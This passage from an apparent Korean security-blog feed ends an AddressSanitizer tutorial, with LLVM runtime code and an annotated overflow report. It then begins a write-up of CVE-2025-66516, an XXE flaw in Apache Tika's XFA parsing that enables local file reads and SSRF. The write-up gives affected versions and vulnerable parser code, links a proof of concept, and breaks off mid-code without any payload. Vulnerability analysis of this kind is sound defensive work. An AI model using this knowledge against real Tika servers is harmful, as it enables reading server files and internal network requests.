&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan_abi_asan_abi_shim.cpp</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-comment">// Functions concerning memory load and store reporting</span><span class="hljs-keyword">void</span> __asan_report_load1(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load2(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">2</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load4(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load8(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load16(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">16</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load_n(uptr addr, uptr size) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, size, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store1(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store2(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">2</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store4(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store8(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store16(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">16</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store_n(uptr addr, uptr size) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, size, <span class="hljs-literal">true</span>);}</code></pre><p>&#xB531; &#xC9C1;&#xAD00;&#xC801;&#xC774;&#xAC8C; &#xC77D;&#xAE30;&#xB294; load, &#xC4F0;&#xAE30;&#xB294; store, &#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xBA87; &#xBC14;&#xC774;&#xD2B8;&#xC778;&#xC9C0;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB798;&#xD551;&#xB41C; &#xD568;&#xC218;&#xC778; <code>__asan_abi_report_XXX_n</code>&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>ReportGenericError()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_report.cpp</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span> __asan_report_error(uptr pc, uptr bp, uptr sp, uptr addr, <span class="hljs-keyword">int</span> is_write,                         uptr access_size, u32 <span class="hljs-built_in">exp</span>) {  ENABLE_FRAME_POINTER;  <span class="hljs-keyword">bool</span> fatal = flags()-&gt;halt_on_error;  ReportGenericError(pc, bp, sp, addr, is_write, access_size, <span class="hljs-built_in">exp</span>, fatal);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ReportGenericError</span><span class="hljs-params">(uptr pc, uptr bp, uptr sp, uptr addr, <span class="hljs-keyword">bool</span> is_write,</span></span><span class="hljs-function"><span class="hljs-params">                        uptr access_size, u32 <span class="hljs-built_in">exp</span>, <span class="hljs-keyword">bool</span> fatal)</span> </span>{  <span class="hljs-keyword">if</span> (__asan_test_only_reported_buggy_pointer) {    *__asan_test_only_reported_buggy_pointer = addr;    <span class="hljs-keyword">return</span>;  }  <span class="hljs-keyword">if</span> (!fatal &amp;&amp; SuppressErrorReport(pc)) <span class="hljs-keyword">return</span>;  ENABLE_FRAME_POINTER;  <span class="hljs-comment">// Optimization experiments.</span>  <span class="hljs-comment">// The experiments can be used to evaluate potential optimizations that remove</span>  <span class="hljs-comment">// instrumentation (assess false negatives). Instead of completely removing</span>  <span class="hljs-comment">// some instrumentation, compiler can emit special calls into runtime</span>  <span class="hljs-comment">// (e.g. __asan_report_exp_load1 instead of __asan_report_load1) and pass</span>  <span class="hljs-comment">// mask of experiments (exp).</span>  <span class="hljs-comment">// The reaction to a non-zero value of exp is to be defined.</span>  (<span class="hljs-keyword">void</span>)<span class="hljs-built_in">exp</span>;  <span class="hljs-function">ScopedInErrorReport <span class="hljs-title">in_report</span><span class="hljs-params">(fatal)</span></span>;  <span class="hljs-function">ErrorGeneric <span class="hljs-title">error</span><span class="hljs-params">(GetCurrentTidOrInvalid(), pc, bp, sp, addr, is_write,</span></span><span class="hljs-function"><span class="hljs-params">                     access_size)</span></span>;  in_report.ReportError(error);}</code></pre><p><code>fatal</code> &#xAC12;&#xC5D0; &#xC758;&#xD574; &#xC5D0;&#xB7EC; &#xBCF4;&#xACE0; &#xD6C4; &#xC885;&#xB8CC;&#xC2DC;&#xD0AC;&#xC9C0; &#xC5EC;&#xBD80;&#xAC00; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC774; &#xAC12; &#xB610;&#xD55C; &#xCEF4;&#xD30C;&#xC77C; &#xC635;&#xC158;&#xACFC; &#xB7F0;&#xD0C0;&#xC784; &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xC758;&#xD574; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-comment"># Activate ASAN Recovery Mode</span>-fsanitize-recover=address<span class="hljs-comment"># Runtime Flag</span>ASAN_OPTIONS=halt_on_error=0</code></pre><p>redzone&#xC5D0;&#xC11C; &#xC608;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD588;&#xB358; &#xCF54;&#xB4DC;&#xC5D0; <code>getchar()</code>&#xB97C; &#xCD94;&#xAC00;&#xD55C; &#xB4A4; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD574;&#xB3C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ g++ redzone.cpp -o redzone -fsanitize=address -fsanitize-recover=address &amp;&amp; ASAN_OPTIONS=halt_on_error=0 ./redzone===================================================================1481048==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff00408791 at pc 0x5593d35b02fa bp 0x7fff00408750 sp 0x7fff00408740WRITE of size 1 at 0x7fff00408791 thread T0...$ <span class="hljs-built_in">echo</span> $? 0</code></pre><h3 id="3-2-&#xC624;&#xB958;-&#xD574;&#xC11D;"><a href="#3-2-&#xC624;&#xB958;-&#xD574;&#xC11D;" class="headerlink" title="3.2 &#xC624;&#xB958; &#xD574;&#xC11D;"></a>3.2 &#xC624;&#xB958; &#xD574;&#xC11D;</h3><p>&#xC624;&#xB958;&#xB294; &#xD06C;&#xAC8C; &#xC694;&#xC57D;, &#xCF5C; &#xC2A4;&#xD0DD;, &#xBA54;&#xBAA8;&#xB9AC; &#xC815;&#xBCF4;, Shadow Bytes &#xC0C1;&#xD0DC; &#xC21C;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xBC14;&#xB85C; &#xC9C1;&#xC804;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; &#xCD9C;&#xB825;&#xB41C; &#xC624;&#xB958; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xAC01; &#xD56D;&#xBAA9;&#xC744; &#xD574;&#xC11D;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs bash">$ ./redzone      ===================================================================1670382==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffaec08e11 at pc 0x5591367762fa bp 0x7fffaec08dd0 sp 0x7fffaec08dc0WRITE of size 1 at 0x7fffaec08e11 thread T0    <span class="hljs-comment">#0 0x5591367762f9 in main (/root/asan/redzone+0x12f9)</span>    <span class="hljs-comment">#1 0x7fe1e1807d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#2 0x7fe1e1807e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#3 0x559136776144 in _start (/root/asan/redzone+0x1144)</span>Address 0x7fffaec08e11 is located <span class="hljs-keyword">in</span> stack of thread T0 at offset 49 <span class="hljs-keyword">in</span> frame    <span class="hljs-comment">#0 0x559136776218 in main (/root/asan/redzone+0x1218)</span>  This frame has 1 object(s):    [32, 48) <span class="hljs-string">&apos;sp&apos;</span> (line 6) &lt;== Memory access at offset 49 overflows this variableHINT: this may be a <span class="hljs-literal">false</span> positive <span class="hljs-keyword">if</span> your program uses some custom stack unwind mechanism, swapcontext or vfork      (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow (/root/asan/redzone+0x12f9) <span class="hljs-keyword">in</span> mainShadow bytes around the buggy address:  0x100075d79170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791b0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1=&gt;0x100075d791c0: 00 00[f3]f3 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-built_in">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      <span class="hljs-built_in">fc</span>  Array cookie:            ac  Intra object redzone:    bb  ASan internal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==1670382==ABORTING</code></pre><p><strong>&#xC624;&#xB958; &#xAC1C;&#xC694;</strong></p><p>&#xC624;&#xB958;&#xC758; &#xC720;&#xD615;&#xC740; stack-buffer-overflow&#xC774;&#xBA70; 1&#xBC14;&#xC774;&#xD2B8; &#xC4F0;&#xAE30;&#xC5D0; &#xB300;&#xD574; thread T0&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xBC11;&#xC5D0;&#xB294; &#xCF5C; &#xC2A4;&#xD0DD;&#xC774; &#xCD9C;&#xB825;&#xB418;&#xC5B4; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBC1C;&#xC0DD;&#xD55C; &#xC704;&#xCE58;: <code>0x5591367762fa</code></li></ul><pre><code class="hljs bash">==1670382==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffaec08e11 at pc 0x5591367762fa bp 0x7fffaec08dd0 sp 0x7fffaec08dc0WRITE of size 1 at 0x7fffaec08e11 thread T0    <span class="hljs-comment">#0 0x5591367762f9 in main (/root/asan/redzone+0x12f9)</span>    <span class="hljs-comment">#1 0x7fe1e1807d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#2 0x7fe1e1807e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#3 0x559136776144 in _start (/root/asan/redzone+0x1144)</span>    Address 0x7fffaec08e11 is located <span class="hljs-keyword">in</span> stack of thread T0 at offset 49 <span class="hljs-keyword">in</span> frame    <span class="hljs-comment">#0 0x559136776218 in main (/root/asan/redzone+0x1218)</span></code></pre><p><strong>&#xBA54;&#xBAA8;&#xB9AC; &#xD504;&#xB808;&#xC784; &#xC815;&#xBCF4;</strong></p><p><code>sp</code>&#xB77C;&#xB294; &#xBC84;&#xD37C;&#xB294; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC5D0;&#xC11C; [32, 48), &#xC989; 16&#xBC14;&#xC774;&#xD2B8;&#xB9CC;&#xD07C; &#xC720;&#xD6A8;&#xD558;&#xC9C0;&#xB9CC; &#xC811;&#xADFC;&#xD55C; &#xC704;&#xCE58;&#xB294; 49&#xB77C;&#xACE0; &#xD45C;&#xC2DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; &#xB85C;&#xADF8;&#xB97C; &#xBCF4;&#xACE0; OOB &#xC4F0;&#xAE30;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">This frame has 1 object(s):  [32, 48) <span class="hljs-string">&apos;sp&apos;</span> (line 6) &lt;== Memory access at offset 49 overflows this variable</code></pre><p><strong>Shadow Bytes &#xC0C1;&#xD0DC;</strong></p><p>&#xC2E4;&#xC81C; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xC9C0;&#xC810;&#xC740; <code>0x100075d791c0</code>&#xBD80;&#xD130; <code>0x100075d791c1</code>&#xC778;&#xB370; <code>=&gt;</code>&#xB85C; &#xD45C;&#xC2DC;&#xB41C; &#xC9C0;&#xC810;&#xC5D0;  Stack right redzone&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; <code>0xf3</code>&#xB85C; &#xD45C;&#xC2DC;&#xB41C; poison &#xC601;&#xC5ED;&#xC5D0; &#xC811;&#xADFC;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xC774; <code>[ ]</code>&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xBC18;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xC0C1;&#xD0DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">Shadow bytes around the buggy address:  0x100075d79170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791b0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1=&gt;0x100075d791c0: 00 00[f3]f3 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</code></pre><p>&#xC624;&#xB958; &#xBCF4;&#xACE0;&#xB97C; &#xD1B5;&#xD574; &#xC624;&#xB958; &#xC704;&#xCE58;, &#xC6D0;&#xC778;, &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xD0DC;&#xAC00; &#xBA85;&#xD655;&#xD558;&#xAC8C; &#xC81C;&#xACF5;&#xB418;&#xC5B4; &#xD3B8;&#xD558;&#xAE34; &#xD558;&#xB124;&#xC694;!</p><h2 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h2><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; Address Sanitizer&#xC5D0; &#xB300;&#xD574; &#xAC00;&#xBCCD;&#xAC8C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! ASan&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;&#xB97C; &#xB9E4;&#xC6B0; &#xB192;&#xC740; &#xC815;&#xD655;&#xB3C4;&#xB85C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; Shadow Memory &#xAC80;&#xC0AC;, redzone &#xC0BD;&#xC785;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C;&#xC758; &#xBE48;&#xBC88;&#xD55C; &#xAC80;&#xC0AC; &#xB4F1;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB7C9;&#xC774; &#xC99D;&#xAC00;&#xD558;&#xACE0; &#xC131;&#xB2A5;&#xC5D0;&#xB3C4; &#xC0C1;&#xB2F9;&#xD55C; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xAC78;&#xB9B0;&#xB2E4;&#xB294; &#xB2E8;&#xC810; &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; ASan&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xB355;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30;&#xBCF4;&#xB2E4;&#xB294; &#xAC1C;&#xBC1C; &#xB2E8;&#xACC4;, &#xD14C;&#xC2A4;&#xD2B8; &#xD658;&#xACBD;, &#xD37C;&#xC9D5;&#xACFC; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xADFC;&#xC5D0;&#xB294; HWASan, UBSan, TSan, LSan&#xCC98;&#xB7FC; Sanitizer&#xB4E4;&#xC758; &#xC885;&#xB958;&#xB4E4;&#xC774; &#xB2E4;&#xC591;&#xD574;&#xC9C0;&#xBA70; &#xC5ED;&#xD560;&#xB3C4; &#xC138;&#xBD84;&#xD654;&#xB418;&#xC5C8;&#xACE0; &#xC120;&#xD0DD;&#xC9C0;&#xB3C4; &#xB9CE;&#xC544;&#xC84C;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; ASan&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC548;&#xC804;&#xC131; &#xAC80;&#xC99D;&#xC5D0; &#xC788;&#xC5B4; &#xAE30;&#xBCF8;&#xC801;&#xC774;&#xACE0; &#xD575;&#xC2EC;&#xC801;&#xC778; &#xB3C4;&#xAD6C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC54C;&#xC544;&#xB450;&#xBA74; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. Chrome &#xAC1C;&#xBC1C;&#xC5D0;&#xC11C;&#xB3C4; &#xC544;&#xC9C1; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;&#xACE0; &#xD558;&#xB2C8;&#xAE4C;&#xC694;. (<del>&#xAD6C;&#xAE00;&#xC774; &#xB9CC;&#xB4E0;&#xAC70;&#xB2C8;&#xAE4C;</del>)</p><p>&#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC880; &#xB354; &#xB2E4;&#xC591;&#xD55C; Sanitizer&#xB97C; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!! &#xB2E4;&#xC74C;&#xC5D0; &#xBD50;&#xAC8C;&#xC694;! &#x1FAC2;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://learn.microsoft.com/ko-kr/cpp/sanitizers/asan?view=msvc-170">https://learn.microsoft.com/ko-kr/cpp/sanitizers/asan?view=msvc-170</a></li><li><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerUseAfterReturn">https://github.com/google/sanitizers/wiki/AddressSanitizerUseAfterReturn</a></li><li><a href="https://clang.llvm.org/docs/AddressSanitizer.html">https://clang.llvm.org/docs/AddressSanitizer.html</a></li><li><a href="https://github.com/llvm/llvm-project/tree/main">https://github.com/llvm/llvm-project/tree/main</a></li><li><a href="https://github.com/google/sanitizers/issues/100">https://github.com/google/sanitizers/issues/100</a></li><li><a href="https://research.google/pubs/addresssanitizer-a-fast-address-sanity-checker/">https://research.google/pubs/addresssanitizer-a-fast-address-sanity-checker/</a></li><li><a href="https://arxiv.org/pdf/2506.05022v2">https://arxiv.org/pdf/2506.05022v2</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/Address-Sanitizer/">Address Sanitizer</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-66516: Apache Tika의 XFA 처리 과정에서 발생하는 XXE 기반 파일 유출 및 SSRF 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/24/gongjae/CVE-2025-66516/</link>
      <guid>https://hackyboiz.github.io/2025/12/24/gongjae/CVE-2025-66516/</guid>
      <pubDate>Wed, 24 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/chasingimpact/CVE-2025-66516-Wri</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC/tree/main">https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC/tree/main</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Tika</p><ul><li>tika-core 1.13 ~ 3.2.1</li><li>tika-parser-pdf-module 2.0.0 ~ 3.2.1</li><li>tika-parsers 1.13 ~ 1.28.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>Apache Tika&#xB294; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xBB38;&#xC11C;(PDF, Office &#xB4F1;)&#xB97C; &#xD14D;&#xC2A4;&#xD2B8;/&#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xCD94;&#xCD9C; &#xC6A9;&#xB3C4;&#xB85C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;/&#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; PDF&#xC5D0;&#xB294; XFA(XML Forms Architecture) &#xB77C;&#xB294; XML &#xAE30;&#xBC18; &#xD3FC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xACE0;, Tika&#xB294; &#xC774;&#xB97C; &#xCD94;&#xCD9C;/&#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; StAX(XMLInputFactory) &#xAE30;&#xBC18; XML &#xD30C;&#xC11C;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; XFA &#xB0B4;&#xBD80; XML&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;(XXE)&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xCC28;&#xB2E8;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;, &#xBB38;&#xC11C; &#xD30C;&#xC2F1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC11C;&#xBC84; &#xB85C;&#xCEEC; &#xD30C;&#xC77C; &#xC77D;&#xAE30; (file://)</li><li>&#xB0B4;&#xBD80;/&#xC678;&#xBD80;&#xB85C; HTTP &#xC694;&#xCCAD; &#xC720;&#xBC1C; (SSRF)</li><li>SSRF/&#xC815;&#xBCF4;&#xC720;&#xCD9C;&#xC744; &#xBC1C;&#xD310;&#xC73C;&#xB85C; &#xCD94;&#xAC00; &#xCDE8;&#xC57D;&#xC810; chaining</li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xD575;&#xC2EC; &#xC6D0;&#xC778;&#xC740; tika-core &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; XFA XML &#xD30C;&#xC11C;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C;, &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xAD6C;&#xD604;/&#xC124;&#xC815;&#xC774; &#xBD88;&#xC644;&#xC804;&#xD588;&#xB358; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D; &#xBC84;&#xC804;&#xC740; <code>tika-core</code>&#xC758; <code>XMLReaderUtils.getXMLInputFactory()</code>&#xC5D0;&#xC11C; &#xB300;&#xB7B5; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xD329;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0; &#xBB34;&#xC2DC; &#xBAA9;&#xC801;&#xC758; resolver&#xB97C; &#xC138;&#xD305;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function">publicstatic <span class="hljs-title">XMLInputFactorygetXMLInputFactory</span><span class="hljs-params">()</span> </span>{XMLInputFactoryfactory= XMLInputFactory.newFactory();    tryToSetStaxProperty(factory, XMLInputFactory.IS_NAMESPACE_AWARE,<span class="hljs-keyword">true</span>);    tryToSetStaxProperty(factory, XMLInputFactory.IS_VALIDATING,<span class="hljs-keyword">false</span>);    factory.setXMLResolver(IGNORING_STAX_ENTITY_RESOLVER);<span class="hljs-comment">// &lt;-- 